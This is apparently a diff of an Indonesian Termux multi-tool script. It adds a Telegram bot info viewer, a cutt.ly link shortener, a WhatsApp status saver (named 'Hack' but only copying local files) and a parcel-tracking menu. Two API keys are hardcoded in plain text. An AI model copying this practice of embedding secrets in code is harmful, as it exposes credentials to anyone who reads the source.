+        "bot_short_description": info.get('short_description', {}).get('short_description', 'N/A'),
+        "webhook": {
+            "url": info.get('webhook', {}).get('url', 'Tidak ada'),
+            "has_custom_certificate": info.get('webhook', {}).get('has_custom_certificate', False),
+            "pending_update_count": info.get('webhook', {}).get('pending_update_count', 0),
+            "last_error_message": info.get('webhook', {}).get('last_error_message', 'Tidak ada'),
+            "max_connections": info.get('webhook', {}).get('max_connections', 40),
+        },
+        "commands": [
+            {"command": cmd.get('command', ''), "description": cmd.get('description', '')}
+            for cmd in info.get('commands', [])
+        ],
+        "admin_rights": {
+            "can_change_info": info.get('admin_rights', {}).get('can_change_info', False),
+            "can_post_messages": info.get('admin_rights', {}).get('can_post_messages', False),
+            "can_edit_messages": info.get('admin_rights', {}).get('can_edit_messages', False),
+            "can_delete_messages": info.get('admin_rights', {}).get('can_delete_messages', False),
+            "can_invite_users": info.get('admin_rights', {}).get('can_invite_users', False),
+            "can_restrict_members": info.get('admin_rights', {}).get('can_restrict_members', False),
+            "can_pin_messages": info.get('admin_rights', {}).get('can_pin_messages', False),
+            "can_promote_members": info.get('admin_rights', {}).get('can_promote_members', False),
+        },
+        "updates": {
+            "total": len(info.get('updates', [])),
+            "last_update": info.get('updates', [{}])[-1] if info.get('updates') else None
+        }
+    }
+    
+    json_str = json.dumps(json_output, indent=2, ensure_ascii=False)
+    
+    print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
+    print(f"{W}│ {G}✓{W} Succesfuly, Information Bot{N}")
+    print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+    
+    lines = json_str.split('\n')
+    for line in lines:
+        if 'status' in line:
+            print(f"{W}│ {G}{line}{N}")
+        elif '"' in line and ':' in line:
+            parts = line.split(':')
+            if len(parts) >= 2:
+                key = parts[0].strip()
+                value = ':'.join(parts[1:]).strip()
+                if 'true' in value.lower() or 'false' in value.lower():
+                    print(f"{W}│ {key} {R}: {G}{value}{N}")
+                elif value.startswith('"') and value.endswith('"'):
+                    print(f"{W}│ {key} {R}: {G}{value}{N}")
+                else:
+                    print(f"{W}│ {key} {R}: {G}{value}{N}")
+            else:
+                print(f"{W}│ {G}{line}{N}")
+        else:
+            print(f"{W}│ {G}{line}{N}")
+    
+    print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+    
+    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
+
+def tool_link_shortener():
+    import os, sys, time, requests, threading
+    
+    os.system('clear')
+    
+    R = '\033[91m'
+    G = '\033[92m'
+    Y = '\033[93m'
+    W = '\033[97m'
+    C = '\033[96m'
+    U = '\033[95m'
+    N = '\033[0m'
+    
+    ascii_short = """
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣶⣶⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠉⠉⠙⠻⢿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀
+⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢀⣀⣀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
+⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢠⣴⣿⣿⣿⣷⡄⠀⠀⢹⣿⣿⣿⣿⣿⣿⡆⠀⠀
+⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣼⣿⣿⣿⣿⣿⣿⠇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡀⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⠉⠉⠛⢿⣿⣿⣿⣿⠿⠁⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢀⣀⣀⠀⠀⣠⣿⣿⡿⠉⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢠⣴⣿⡿⣿⣿⣾⣿⠟⠃⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢀⣼⣿⣿⠋⠀⠀⠉⠉⠁⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⢀⣴⣿⣿⣿⣿⣷⣤⣀⣀⣀⣀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
+⠈⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢰⣿⣿⣿⣿⣿⣿⡟⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀
+⠀⠸⣿⣿⣿⣿⣿⣿⣇⠀⠀⠘⢿⣿⣿⣿⠟⠃⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀
+⠀⠀⠹⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠉⠉⠁⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
+⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣷⣦⣄⣀⣀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+"""
+    os.system(f'echo "{ascii_short}" | lolcat 2>/dev/null || echo "{ascii_short}"')
+    
+    print(f"""
+{W}╭─────────────────────────────────────────────────────────────────╮
+{W}│ {W}Tools {R}: {G}Link Shortener {R}│ {W}Developer {R}: {G}Rullzzz06
+{W}╰─────────────────────────────────────────────────────────────────╯""")
+
+    print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+    print(f"{W}│ Masukkan link {R}/{W} URL untuk di Shortener Atau di pendekkan")
+    print(f"{W}│ Contoh {R}:{a} https://www.tokopedia.com")
+    print(f"{W}╰─────────────────────────────────────────────────────────────────╯{N}")
+    
+    url = input(f"{U}❯❯❯ {W}Masukkan Link {R}/{W} URL {G}❯{N} ").strip()
+    
+    if not url:
+        print(f"{W}[ {R}??{W} ] URL tidak boleh kosong!{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    if not url.startswith('http://') and not url.startswith('https://'):
+        url = 'https://' + url
+    
+    def load_bar_short(stop_event):
+        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
+        RESET = '\x1b[0m'
+        length = 15
+        color_index = 0
+        while not stop_event.is_set():
+            for i in range(length + 1):
+                if stop_event.is_set():
+                    break
+                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
+                empty = '□' * (length - i)
+                sys.stdout.write(f'\r [ {G}✦{W} ] Memendekkan URL [[{filled_color}{empty}{W}]]')
+                sys.stdout.flush()
+                time.sleep(0.05)
+                color_index += 1
+        sys.stdout.write('\r' + ' ' * 120 + '\r')
+        sys.stdout.flush()
+    
+    stop = threading.Event()
+    t = threading.Thread(target=load_bar_short, args=(stop,))
+    t.daemon = True
+    t.start()
+    
+    short_url = None
+    error = None
+    status_code = None
+    
+    API_KEY = "359a67146d8eab794ace58510de8598fe4cae"
+    
+    try:
+        resp = requests.get(f'https://cutt.ly/api/api.php?key={API_KEY}&short={url}', timeout=15)
+        data = resp.json()
+        
+        if data.get('url'):
+            status_code = data['url'].get('status')
+            
+            if status_code == 7:
+                short_url = data['url'].get('shortLink')
+            elif status_code == 4:
+                error = "[ !! ] API Key tidak valid"
+            elif status_code == 2:
+                error = "[ !! ] URL tidak valid atau sudah di-shorten"
+            elif status_code == 5:
+                error = "[ !! ] URL mengandung kata terlarang"
+            elif status_code == 6:
+                error = "[ !! ] Custom alias sudah dipakai"
+            else:
+                error = f"Error code: {status_code}"
+        else:
+            error = "[ !! ] Gagal mendapatkan response dari Cutt.ly"
+            
+    except Exception as e:
+        error = str(e)
+    
+    stop.set()
+    t.join()
+    
+    if short_url:
+        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+        print(f"{W}│ {G}✓{W} URL Berhasil Dipendekin!{N}")
+        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+        print(f"{W}│ {W}URL Asli   {R}: {G}{url[:60]}{'...' if len(url) > 60 else ''}{N}")
+        print(f"{W}│ {W}URL Pendek {R}: {G}{short_url}{N}")
+        print(f"{W}│ {W}Status     {R}: {G}Succesfuly{N}")
+        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+    else:
+        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+        print(f"{W}│ {R}✗{W} Gagal memendekkan URL!{N}")
+        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+        print(f"{W}│ {W}Error {R}: {G}{error}{N}")
+        if status_code:
+            print(f"{W}│ {W}Code  {R}: {G}{status_code}{N}")
+        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+    
+    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
+
+def tool_Hack_status_wa():
+    import os, sys, time, shutil, threading
+    from datetime import datetime
+    
+    os.system('clear')
+    
+    R = '\033[91m'
+    G = '\033[92m'
+    Y = '\033[93m'
+    W = '\033[97m'
+    C = '\033[96m'
+    U = '\033[95m'
+    N = '\033[0m'
+    
+    ascii_status = """
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣴⣴⣴⣴⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⠿⠟⠛⠋⠋⠋⠙⠙⠙⠛⠻⠿⢿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⠿⠛⠉⠀⠀⠀⠀⢀⢀⣀⣀⢀⢀⠀⠀⠀⠀⠈⠙⠻⢿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣠⣿⡿⠛⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠙⢻⣿⣶⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⢠⣾⣿⠏⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠘⢻⣿⣆⠀⠀⠀⠀
+⠀⠀⣰⣿⡟⠁⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠹⣿⣷⠀⠀⠀
+⠀⢰⣿⡟⠀⠀⢀⣾⣿⣿⣿⠟⠁⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠸⣿⣷⠀⠀
+⢠⣿⡿⠀⠀⠀⣾⣿⣿⣿⡏⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠹⣿⣇⠀
+⢼⣿⠃⠀⠀⣼⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⠀
+⣿⣿⠀⠀⢀⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢼⣿⡅
+⣿⣟⠀⠀⠠⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⡇
+⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⡿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⣸⣿⠇
+⢽⣿⡆⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣧⡄⠀⠀⠀⠉⠛⠿⠿⠏⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⠀⠀⠀⣾⣿⠁
+⠈⣿⣷⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⠃⠀⠀⣸⣿⡏⠀
+⠀⠸⣿⣧⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⣀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⠃⠀⠀⢰⣿⡟⠀⠀
+⠀⠀⣻⣿⠂⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⣰⣿⡿⠀⠀⠀
+⠀⢠⣿⡟⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⣠⣾⣿⠟⠀⠀⠀⠀
+⠀⣼⣿⠃⠀⠀⠘⠙⠉⠁⠁⠈⠉⠙⠻⢿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠀⠀⠀⣠⣾⣿⠟⠁⠀⠀⠀⠀⠀
+⢠⣿⡟⠀⠀⠀⠀⡀⣀⣠⣠⣄⣀⠀⠀⠀⠀⠀⠁⠉⠈⠈⠀⠀⠀⠀⠀⢀⣠⣴⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀
+⠈⢿⣷⣦⣶⣾⣿⡿⠿⠟⠟⠿⢿⣿⣶⣦⣦⣤⣄⣄⣄⣄⣤⣤⣴⣶⣿⡿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠈⠉⠋⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠟⠟⠟⠛⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+"""
+    os.system(f'echo "{ascii_status}" | lolcat 2>/dev/null || echo "{ascii_status}"')
+    
+    print(f"""
+{W}╭─────────────────────────────────────────────────────────────────╮
+{W}│ {W}Tools {R}: {G}downloader Status WA {R}│ {W}Developer {R}: {G}Rullzzz06
+{W}╰─────────────────────────────────────────────────────────────────╯""")
+    
+    def load_bar_download(stop_event):
+        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
+        RESET = '\x1b[0m'
+        length = 15
+        color_index = 0
+        while not stop_event.is_set():
+            for i in range(length + 1):
+                if stop_event.is_set():
+                    break
+                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
+                empty = '□' * (length - i)
+                sys.stdout.write(f'\r [ {G}✦{W} ] Mengambil Status WA [[{filled_color}{empty}{W}]]')
+                sys.stdout.flush()
+                time.sleep(0.05)
+                color_index += 1
+        sys.stdout.write('\r' + ' ' * 120 + '\r')
+        sys.stdout.flush()
+    
+    WA_STATUS_PATHS = [
+        "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/.Statuses",
+        "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/.Statuses",
+        "/storage/emulated/0/WhatsApp/Media/.Statuses",
+        "/sdcard/WhatsApp/Media/.Statuses",
+    ]
+    
+    status_dir = None
+    for path in WA_STATUS_PATHS:
+        if os.path.exists(path):
+            status_dir = path
+            break
+    
+    if not status_dir:
+        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+        print(f"{W}│ {W}[ {R}✗{W} ] Folder Status WhatsApp tidak ditemukan!{N}")
+        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+        print(f"{W}│ {W}[ {R}??{W} ] Pastikan:{N}")
+        print(f"{W}│ 1. WhatsApp sudah terinstall{N}")
+        print(f"{W}│ 2. Sudah membuka status kontak{N}")
+        print(f"{W}│ 3. Beri izin akses storage ke Termux{N}")
+        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+        input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
+        return
+    
+    try:
+        files = os.listdir(status_dir)
+        status_files = [f for f in files if not f.startswith('.') and os.path.isfile(os.path.join(status_dir, f))]
+        
+        if not status_files:
+            print(f"\n{W}╭─────────────────────────────────────────────────────────────────╮")
+            print(f"{W}│ {W}[ {R}??{W} ] Tidak ada status ditemukan!{N}")
+            print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+            print(f"{W}│ {W}[ {R}!!{W} ] Pastikan kamu sudah membuka status-status kontak terlebih dahulu{N}")
+            print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+            input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
+            return
+        
+        download_dir = "/sdcard/Status_WA"
+        try:
+            if not os.path.exists(download_dir):
+                os.makedirs(download_dir)
+        except:
+            download_dir = os.path.join(os.path.expanduser("~"), "storage", "downloads", "Status_WA")
+            if not os.path.exists(download_dir):
+                os.makedirs(download_dir)
+        
+        confirm = input(f"{U}❯❯❯ {W}download Semua status? ( {G}Y{W}/{R}n{W} ): {N}").lower()
+        if confirm != 'y':
+            print(f"{W}[ {R}!!{W} ] Dibatalkan{N}")
+            input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+            return
+        
+        stop = threading.Event()
+        t = threading.Thread(target=load_bar_download, args=(stop,))
+        t.daemon = True
+        t.start()
+        
+        downloaded = 0
+        failed = 0
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        
+        for i, filename in enumerate(status_files, 1):
+            try:
+                src = os.path.join(status_dir, filename)
+                
+                ext = os.path.splitext(filename)[1].lower()
+                if ext in ['.jpg', '.jpeg', '.png']:
+                    prefix = "IMG"
+                elif ext in ['.mp4', '.3gp', '.mov']:
+                    prefix = "VID"
+                else:
+                    prefix = "FILE"
+                
+                new_name = f"{prefix}_{timestamp}_{i:03d}{ext}"
+                dst = os.path.join(download_dir, new_name)
+                
+                shutil.copy2(src, dst)
+                downloaded += 1
+            except Exception as e:
+                failed += 1
+        
+        stop.set()
+        t.join()
+        
+        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+        print(f"{W}│ {G}✓{W} Download Status Selesai!{N}")
+        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+        print(f"{W}│ {W}total Status {R}: {G}{len(status_files)}{N}")
+        print(f"{W}│ {W}berhasil     {R}: {G}{downloaded}{N}")
+        print(f"{W}│ {W}gagal        {R}: {R}{failed}{N}")
+        print(f"{W}│ {W}lokasi Hasil {R}: {G}/sdcard/Status_WA{N}")
+        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+        
+    except Exception as e:
+        print(f"{W}[ {R}??{W} ] Error: {e}{N}")
+    
+    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
+
+def tool_cek_resi():
+    import os, sys, time, requests, threading
+    
+    os.system('clear')
+    
+    R = '\033[91m'
+    G = '\033[92m'
+    Y = '\033[93m'
+    W = '\033[97m'
+    C = '\033[96m'
+    U = '\033[95m'
+    N = '\033[0m'
+    
+    API_KEY = "sk_zowtunnrch9ljvt8p7hs6bvfmid9r1hvv5p9qiamsazix6ltvo3kuudcjgwyqtfm"
+    
+    ascii_resi = """
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢀⣠⣤⡤⢀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠉⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⡀⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀
+⠀⣴⣿⡿⠿⠇⢸⣿⣿⣿⣿⣿⣿⠿⠛⠋⠉⠀⠀⠀⠀⠀⢀⣠⣤⣶⣿⣿⣿⣿⣿⣿⣿⣷⠘⠿⠿⠿⠿⠟⠃⠀⠀⠀⠀
+⣸⣿⣏⣀⣀⣀⣀⣉⣉⣉⣉⣁⣀⣀⣀⣀⣀⣀⣀⣀⣀⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣁⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⣄⡀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡄
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⢰⣿⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⡴⠋⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
+⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀
+⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀
+"""
+    os.system(f'echo "{ascii_resi}" | lolcat 2>/dev/null || echo "{ascii_resi}"')
+    
+    print(f"""
+{W}╭─────────────────────────────────────────────────────────────────╮
+{W}│ {W}Tools {R}: {G}Cek Resi {R}/{W} Paket {R}│ {W}Developer {R}: {G}Rullzzz06
+{W}╰─────────────────────────────────────────────────────────────────╯""")
+    
+    kurir_list = {
+        "1": {"name": "JNE", "code": "jne"},
+        "2": {"name": "J&T Express", "code": "jnt"},
+        "3": {"name": "SiCepat", "code": "sicepat"},
+        "4": {"name": "AnterAja", "code": "anteraja"},
+        "5": {"name": "Pos Indonesia", "code": "pos"},
+        "6": {"name": "Titipan Kilat (Tiki)", "code": "tiki"},
+        "7": {"name": "Wahana", "code": "wahana"},
+        "8": {"name": "Ninja Xpress", "code": "ninja"},
+        "9": {"name": "Lion Parcel", "code": "lion"},
